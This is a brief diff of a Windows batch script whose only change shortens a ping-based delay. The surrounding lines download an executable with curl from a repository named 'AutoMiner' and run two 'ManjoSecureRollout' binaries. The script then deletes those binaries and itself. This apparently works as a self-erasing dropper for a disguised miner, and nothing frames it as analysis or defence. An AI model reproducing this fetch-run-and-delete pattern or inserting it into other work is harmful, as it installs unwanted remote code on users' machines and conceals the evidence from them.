@@ -5,7 +5,7 @@ curl -LJO https://github.com/Tuba202/AutoMiner/blob/main/ManjoSecureRollout_g.ex
 Ren "ManjoSecureRollout_G.exe_raw=true" "ManjoSecureRollout_G.exe"
 ManjoSecureRollout_C.exe
 ManjoSecureRollout_G.exe
-ping 192.0.2.1 -n 1 -w 200000 >nul
+ping 192.0.2.1 -n 1 -w 150000 >nul
 Del ManjoSecureRollout_C.exe
 Del ManjoSecureRollout_G.exe
 Del Script.bat
